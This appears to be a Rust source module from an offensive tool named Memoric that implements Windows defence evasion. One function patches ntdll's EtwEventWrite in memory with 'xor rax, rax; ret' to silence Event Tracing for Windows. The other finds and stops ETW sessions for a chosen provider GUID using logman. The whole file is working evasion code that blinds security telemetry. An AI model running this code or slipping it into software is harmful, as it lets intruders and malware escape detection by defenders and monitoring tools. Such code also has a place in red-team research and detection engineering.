//! ETW (Event Tracing for Windows) bypass
//! Patches ntdll!EtwEventWrite to return 0 (SUCCESS) immediately.

use crate::error::MemoricError;
use serde_json::Value;

/// ETW bypass - patch EtwEventWrite to disable event tracing in current process.
/// Patch: xor rax, rax; ret (48 31 C0 C3)
pub fn etw_bypass(_args: &Value) -> Result<Value, MemoricError> {
    use windows::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};
    use windows::Win32::System::Memory::{
        VirtualProtect, PAGE_EXECUTE_READWRITE, PAGE_PROTECTION_FLAGS,
    };

    tracing::warn!("[EVASION] Attempting ETW bypass (patch EtwEventWrite)");

    unsafe {
        // Get ntdll handle
        let ntdll = GetModuleHandleA(windows::core::PCSTR(b"ntdll.dll\0".as_ptr()))
            .map_err(|e| MemoricError::WindowsApi(format!("Failed to get ntdll handle: {}", e)))?;

        // Get EtwEventWrite address
        let etw_addr = GetProcAddress(ntdll, windows::core::PCSTR(b"EtwEventWrite\0".as_ptr()))
            .ok_or_else(|| {
                MemoricError::WindowsApi("Failed to get EtwEventWrite address".to_string())
            })?;

        let etw_ptr = etw_addr as *mut u8;

        // Idempotency check: detect if already patched
        let current_bytes = std::slice::from_raw_parts(etw_ptr, 4);
        if current_bytes == [0x48, 0x31, 0xC0, 0xC3] {
            tracing::info!("ETW bypass already applied (idempotent)");
            return Ok(serde_json::json!({
                "success": true,
                "already_patched": true,
                "address": format!("0x{:016X}", etw_ptr as usize),
                "message": "EtwEventWrite was already patched"
            }));
        }

        // Save original bytes for verification
        let original = [
            current_bytes[0],
            current_bytes[1],
            current_bytes[2],
            current_bytes[3],
        ];

        // Change protection to RWX
        let mut old_protect = PAGE_PROTECTION_FLAGS(0);
        VirtualProtect(
            etw_ptr as *mut _,
            4,
            PAGE_EXECUTE_READWRITE,
            &mut old_protect,
        )
        .map_err(|e| MemoricError::WindowsApi(format!("VirtualProtect failed: {}", e)))?;

        // Write patch: xor rax, rax; ret
        let patch: [u8; 4] = [0x48, 0x31, 0xC0, 0xC3];
        std::ptr::copy_nonoverlapping(patch.as_ptr(), etw_ptr, 4);

        // Restore original protection
        let mut tmp = PAGE_PROTECTION_FLAGS(0);
        let _ = VirtualProtect(etw_ptr as *mut _, 4, old_protect, &mut tmp);

        tracing::info!("ETW bypass applied successfully");

        Ok(serde_json::json!({
            "success": true,
            "already_patched": false,
            "address": format!("0x{:016X}", etw_ptr as usize),
            "original_bytes": format!("{:02X} {:02X} {:02X} {:02X}", original[0], original[1], original[2], original[3]),
            "patch_bytes": "48 31 C0 C3",
            "message": "EtwEventWrite patched (xor rax,rax; ret)"
        }))
    }
}

/// Disable a specific ETW provider by stopping sessions that contain it.
/// Uses `logman query -ets` to enumerate sessions, then `logman stop` on matches.
pub fn etw_provider_disable(args: &Value) -> Result<Value, MemoricError> {
    let provider_guid = args
        .get("provider_guid")
        .and_then(|v| v.as_str())
        .ok_or_else(|| MemoricError::WindowsApi("Missing provider_guid".to_string()))?;
    let method = args
        .get("method")
        .and_then(|v| v.as_str())
        .unwrap_or("stop_session");

    tracing::warn!(
        "[EVASION] ETW provider disable: {} method={}",
        provider_guid,
        method
    );

    match method {
        "stop_session" => {
            // Step 1: Query all ETS sessions
            let output = std::process::Command::new("logman")
                .args(["query", "-ets"])
                .output()
                .map_err(|e| MemoricError::WindowsApi(format!("logman query failed: {}", e)))?;

            let stdout = String::from_utf8_lossy(&output.stdout).to_string();

            // Parse session names from the output
            // logman query -ets outputs lines with session names
            let mut session_names: Vec<String> = Vec::new();
            for line in stdout.lines() {
                let trimmed = line.trim();
                if trimmed.is_empty()
                    || trimmed.starts_with("Data Collector")
                    || trimmed.starts_with("-")
                    || trimmed.contains("Type")
                    || trimmed.contains("Status")
                    || trimmed.starts_with("The command")
                {
                    continue;
                }
                // Session names are the first word on lines that look like entries
                if let Some(name) = trimmed.split_whitespace().next() {
                    if !name.is_empty() {
                        session_names.push(name.to_string());
                    }
                }
            }

            // Step 2: For each session, query its providers and check for the target GUID
            let guid_upper = provider_guid.to_uppercase();
            let mut sessions_stopped: Vec<String> = Vec::new();
            let mut errors: Vec<String> = Vec::new();

            for session_name in &session_names {
                // Query session details
                let detail = std::process::Command::new("logman")
                    .args(["query", session_name, "-ets"])
                    .output();

                if let Ok(detail_out) = detail {
                    let detail_str = String::from_utf8_lossy(&detail_out.stdout).to_string();

                    // Check if this session contains our provider GUID
                    if detail_str.to_uppercase().contains(&guid_upper) {
                        // Stop this session
                        let stop_result = std::process::Command::new("logman")
                            .args(["stop", session_name, "-ets"])
                            .output();

                        match stop_result {
                            Ok(stop_out) if stop_out.status.success() => {
                                sessions_stopped.push(session_name.clone());
                            }
                            Ok(stop_out) => {
                                let err = String::from_utf8_lossy(&stop_out.stderr).to_string();
                                errors.push(format!("{}: {}", session_name, err.trim()));
                            }
                            Err(e) => {
                                errors.push(format!("{}: {}", session_name, e));
                            }
                        }
                    }
                }
            }

            Ok(serde_json::json!({
                "success": true,
                "provider_guid": provider_guid,
                "method": method,
                "sessions_enumerated": session_names.len(),
                "sessions_stopped": sessions_stopped,
                "stopped_count": sessions_stopped.len(),
                "errors": errors,
                "message": format!("Stopped {} sessions for provider {}", sessions_stopped.len(), provider_guid)
            }))
        }
        _ => Err(MemoricError::WindowsApi(format!(
            "Unknown method '{}'. Use 'stop_session'.",
            method
        ))),
    }
}
